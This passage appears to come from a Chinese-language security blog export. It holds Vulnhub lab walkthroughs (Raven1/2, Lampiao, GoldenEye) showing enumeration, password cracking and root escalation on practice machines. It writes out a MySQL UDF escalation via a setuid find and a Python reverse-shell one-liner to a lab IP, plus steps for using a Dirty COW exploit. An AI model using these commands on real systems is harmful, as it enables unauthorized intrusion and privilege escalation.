table and column names</span><br><span class="line">You can turn off <span class="keyword">this</span> feature to <span class="keyword">get</span> a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="function">create table <span class="title">foo</span>(<span class="params">line blob</span>)</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="function">rows <span class="title">affected</span> (<span class="params"><span class="number">0.12</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; insert <span class="keyword">into</span> foo <span class="title">values</span>(<span class="params">load_file(<span class="string">'/var/www/html/1518.so'</span></span>))</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="function">row <span class="title">affected</span> (<span class="params"><span class="number">0.12</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile '/usr/lib/mysql/plugin/1518.so'</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="function">row <span class="title">affected</span> (<span class="params"><span class="number">0.03</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; create function do_system returns integer soname '1518.so'</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="function">rows <span class="title">affected</span> (<span class="params"><span class="number">0.11</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> mysql.func</span>;</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| name      | ret | dl      | type     |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| do_system |   <span class="number">2</span> | <span class="number">1518.</span>so | function |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line"><span class="number">1</span> <span class="function">row <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.00</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> <span class="title">do_system</span>(<span class="params"><span class="string">'chmod u+s /usr/bin/find'</span></span>)</span>;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(<span class="string">'chmod u+s /usr/bin/find'</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    <span class="number">0</span> |</span><br><span class="line">+--------------------------------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.01</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; quit</span></span><br><span class="line"><span class="function">Bye</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">touch foo</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">find foo -exec 'whoami' \</span>;</span><br><span class="line"></span><br><span class="line">find foo -exec <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/02/Raven2/image-20200302151918277.png" alt="image-20200302151918277"></p>
<p>恭喜闯关成功！</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Raven1</title>
    <url>/2020/03/01/Raven1/</url>
    <content><![CDATA[<h1 id="0X00-信息收集"><a href="#0X00-信息收集" class="headerlink" title="0X00 信息收集"></a><strong>0X00 信息收集</strong></h1><p><img src="/2020/03/01/Raven1/image-20200301234057318.png" alt="image-20200301234057318"></p>
<p><img src="/2020/03/01/Raven1/image-20200301234200183.png" alt="image-20200301234200183"></p>
<p>80撬它 警察姐姐 我是正规的安全工程师哦 </p>
<p><img src="/2020/03/01/Raven1/image-20200301234302966.png" alt="image-20200301234302966"></p>
<p>扫一下目录</p>
<p><img src="/2020/03/01/Raven1/image-20200301234349002.png" alt="image-20200301234349002"></p>
<p>ok  <a href="http://172.16.24.37/service.html" target="_blank" rel="noopener">http://172.16.24.37/service.html</a> 拿到了第一个flag，在源代码262行处</p>
<p><img src="/2020/03/01/Raven1/image-20200301234534546.png" alt="image-20200301234534546"></p>
<h1 id="0x01-获取帐号"><a href="#0x01-获取帐号" class="headerlink" title="0x01 获取帐号"></a><strong>0x01 获取帐号</strong></h1><p>扫目录有个地方是wordpress</p>
<p>那么wpscan开怼 账号拿到</p>
<p><img src="/2020/03/01/Raven1/image-20200302005818194.png" alt="image-20200302005818194"></p>
<p>/var/www/下找到 flag2</p>
<p><img src="/2020/03/01/Raven1/image-20200302010009561.png" alt="image-20200302010009561"></p>
<p>拿数据库账号</p>
<p><img src="/2020/03/01/Raven1/image-20200302010223595.png" alt="image-20200302010223595"></p>
<p><img src="/2020/03/01/Raven1/image-20200302010258471.png" alt="image-20200302010258471"></p>
<p>mysql账户密码为：“root”、“R<a href="https://github.com/v3nSecurity" target="_blank" rel="noopener">@v3nSecurity</a>”</p>
<p>登陆 select咔咔一波</p>
<p><img src="/2020/03/01/Raven1/image-20200302010848864.png" alt="image-20200302010848864"></p>
<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a>  干就完了 奥利给</p>
<p><img src="/2020/03/01/Raven1/image-20200302011129407.png" alt="image-20200302011129407"></p>
<p>得到<code>steven</code>密码为<code>pink84</code></p>
<h1 id="0x02-python提权"><a href="#0x02-python提权" class="headerlink" title="0x02 python提权"></a><strong>0x02 python提权</strong></h1><p>su过去 python切到/bin/bash 大哥搞定！</p>
<p><img src="/2020/03/01/Raven1/image-20200302011456706.png" alt="image-20200302011456706"></p>
<p>还有其他思路其实</p>
<p>存在<code>CVE-2016-6662 mysql</code>远程代码执行/权限提升漏洞<br>还可以<code>UDF</code>提权</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Lampiao</title>
    <url>/2020/03/01/Lampiao/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p>老生常谈</p>
<p><img src="/2020/03/01/Lampiao/image-20200301164232495.png" alt="image-20200301164232495"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301164422065.png" alt="image-20200301164422065"></p>
<p>1898看一下喽 用的google插件 看到了cms是Drupal7,具体是什么小版本呢？接下来看</p>
<p><img src="/2020/03/01/Lampiao/image-20200301164729523.png" alt="image-20200301164729523"></p>
<p>常规思路 要扫描的 这里不展示了 看下防爬 有个日志文件 最后一次更新小版本54</p>
<p>这个是RCE的 CVE编号CVE-2018-7600 poc构造附上 <a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a></p>
<p><img src="/2020/03/01/Lampiao/image-20200301165005159.png" alt="image-20200301165005159"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301165045429.png" alt="image-20200301165045429"></p>
<p>msf启动 search到了drupal 就你了四号种子选手</p>
<p><img src="/2020/03/01/Lampiao/image-20200301165434860.png" alt="image-20200301165434860"></p>
<h1 id="0x01-获取会话"><a href="#0x01-获取会话" class="headerlink" title="0x01 获取会话"></a><strong>0x01 获取会话</strong></h1><p><img src="/2020/03/01/Lampiao/image-20200301165628660.png" alt="image-20200301165628660"></p>
<p>由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/2020/03/01/Lampiao/image-20200301165741613.png" alt="image-20200301165741613"></p>
<h1 id="0x02-寻找突破"><a href="#0x02-寻找突破" class="headerlink" title="0x02 寻找突破"></a><strong>0x02 寻找突破</strong></h1><p>html路径下的四个文件 传回来查看</p>
<ol>
<li>qrc.png：一个二维码，扫出来的结果是 Try harger! muahuahuahua，被作者鼓励了。。</li>
<li>audio.m4a：提示为user tiago，说明要先找到用户tiago的密码</li>
<li>uizGonzaga-LampiaoFalou.mp3：一首音乐，丢入隐写工具没发现什么异常</li>
<li>lampiao.jpg：一张牛仔的图片，丢入binwlak中未发现有什么隐写</li>
</ol>
<p>var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码</p>
<p><img src="/2020/03/01/Lampiao/image-20200301170402837.png" alt="image-20200301170402837"></p>
<h1 id="0x03-获取普通权限"><a href="#0x03-获取普通权限" class="headerlink" title="0x03 获取普通权限"></a><strong>0x03 获取普通权限</strong></h1><p>其实root加数据库密码也上去了 </p>
<p><img src="/2020/03/01/Lampiao/image-20200301170722270.png" alt="image-20200301170722270"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301170854563.png" alt="image-20200301170854563"></p>
<p>翻来覆去怎么也没折腾到主机root权限 看下内核吧 说不定能脏牛呢</p>
<p><img src="/2020/03/01/Lampiao/image-20200301171113982.png" alt="image-20200301171113982"></p>
<p>说啥来啥 哈哈 </p>
<h1 id="0x03-dirty-cow提权"><a href="#0x03-dirty-cow提权" class="headerlink" title="0x03 dirty cow提权"></a><strong>0x03 dirty cow提权</strong></h1><p>exploit-db给了exp 🔗 <a href="https://www.exploit-db.com/exploits/40847" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40847</a></p>
<p>我用的msf里的</p>
<p><img src="/2020/03/01/Lampiao/image-20200301173935106.png" alt="image-20200301173935106"></p>
<p><img src="/2020/03/01/Lampiao/image-20200301173909301.png" alt="image-20200301173909301"></p>
<p>python开个http 靶机wget下载</p>
<p><img src="/2020/03/01/Lampiao/image-20200301174353272.png" alt="image-20200301174353272"></p>
<p>编译一下 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</p>
<p>./40847</p>
<p>执行成功，root用户需要用dirtyCowFun密码登录服务器。</p>
<p>ssh重新连接，用户为root，密码为dirtyCowFun</p>
<p><img src="/2020/03/01/Lampiao/image-20200301174535764.png" alt="image-20200301174535764"></p>
<h1 id="0x04-拿到flag"><a href="#0x04-拿到flag" class="headerlink" title="0x04 拿到flag"></a><strong>0x04 拿到flag</strong></h1><p><img src="/2020/03/01/Lampiao/image-20200301174904144.png" alt="image-20200301174904144"></p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>GoldenEye</title>
    <url>/2020/02/29/GoldenEye/</url>
    <content><![CDATA[<h1 id="0x00-知识要点"><a href="#0x00-知识要点" class="headerlink" title="0x00 知识要点"></a><strong>0x00 知识要点</strong></h1><p>1.js信息泄露<br>2.hydra爆破pop3服务<br>3.登陆pop3服务（nc，list，retr）<br>4.moodle平台<br>5.拼写检查getshell<br>6.Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation提权</p>
<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a><strong>0x01 信息收集</strong></h1><p>没什么说的 nmap开路</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229153745956.png" alt="image-20200229153745956"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229164431947.png" alt="image-20200229164431947"></p>
<p>80端口</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229164431947.png" alt="image-20200229164431947"></p>
<p>那么我们就尝试访问下吧</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229154627261.png" alt="image-20200229154627261"></p>
<p>CTF的常规思路 看页面源码</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229154847054.png" alt="image-20200229154847054"></p>
<p>发现个js 跟过去 看看我看到了什么</p>
<p>两个人名 Natalya和Boris</p>
<p>编码解码后得到密码 InvincibleHack3r</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229155010107.png" alt="image-20200229155010107"></p>
<p>这里注意 通过小写的boris加密码才能登陆进去</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229160731176.png" alt="image-20200229160731176"></p>
<p>文中意思pop3在5万多的端口，hydra爆它！</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229170142495.png" alt="image-20200229170142495"></p>
<p>拿到账号 nc去连</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229171304311.png" alt="image-20200229171304311"></p>
<p>文件2发现信息</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229171414370.png" alt="image-20200229171414370"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229171706959.png" alt="image-20200229171706959"></p>
<p>既然告诉了 那么就执行吧 设置下本地hosts 否则公网这个域名可不是什么好网站 嘿嘿</p>
<p>用给的账号密码登录上去 </p>
<p><img src="/2020/02/29/GoldenEye/image-20200229173757810.png" alt="image-20200229173757810"></p>
<p>知道了这个博士也有pop3账号 那么继续爆他</p>
<p>爆完继续nc连pop3 老轨迹 看邮件 拿到web账号</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229175240633.png" alt="image-20200229175240633"></p>
<p>登上去发现txt文件</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229175804918.png" alt="image-20200229175804918"></p>
<p>下载下来 看下文件属性 </p>
<p><img src="/2020/02/29/GoldenEye/image-20200229180717132.png" alt="image-20200229180717132"></p>
<p>base64解密 脑洞一下 首页说有admin账户 结合这个 登一下</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229181059568.png" alt="image-20200229181059568"></p>
<p>admin权限还挺大 python弹shell nc接着</p>
<p>poc这里 ip端口换一下 </p>
<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.43.201”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/bash”)’</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229181554758.png" alt="image-20200229181554758"></p>
<p>网站一些配置要改否则弹不出来</p>
<p><img src="/2020/02/29/GoldenEye/233.png" alt="233"></p>
<p>点这个倒三角 </p>
<h1 id="0x02-开始反连"><a href="#0x02-开始反连" class="headerlink" title="0x02 开始反连"></a><strong>0x02 开始反连</strong></h1><p><img src="/2020/02/29/GoldenEye/3334.png" alt="3334"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229182613818.png" alt="image-20200229182613818"></p>
<p>看下内核 好像可以提权 exp去exploit db就行</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229190909045.png" alt="image-20200229190909045"></p>
<p>靶机没gcc环境 要改下exp  gcc改成cc仅这一处即可</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229191330300.png" alt="image-20200229191330300"></p>
<p>python起个http wget过去 exp放着下面 访问路径要注意 这里我失误了几次</p>
<p><img src="/2020/02/29/GoldenEye/image-20200229192156502.png" alt="image-20200229192156502"></p>
<p>编译一下 给个权限 </p>
<h1 id="0x03-提权成功"><a href="#0x03-提权成功" class="headerlink" title="0x03 提权成功"></a><strong>0x03 提权成功</strong></h1><p><img src="/2020/02/29/GoldenEye/image-20200229192551692.png" alt="image-20200229192551692"></p>
<p><img src="/2020/02/29/GoldenEye/image-20200229192806714.png" alt="image-20200229192806714"></p>
<p>访问下路径 此时bgm响起 题材不错很有意思</p>
<p><img src="/2020/02/29/GoldenEye/111.jpeg" alt="111"></p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>About me</title>
    <url>/2020/02/28/About%20me/</url>
    <content><![CDATA[<p>|     A Hacker，live in Beijing，China.</p>
<p>姓名：loki<br>现居：北京<br>Github：aooboo<br>微信：IFBBPROkyle</p>
<p><img src="/2020/02/28/About%20me/WechatIMG6.jpeg" alt="image-20200314161936240"></p>
]]></content>
  </entry>
</search>
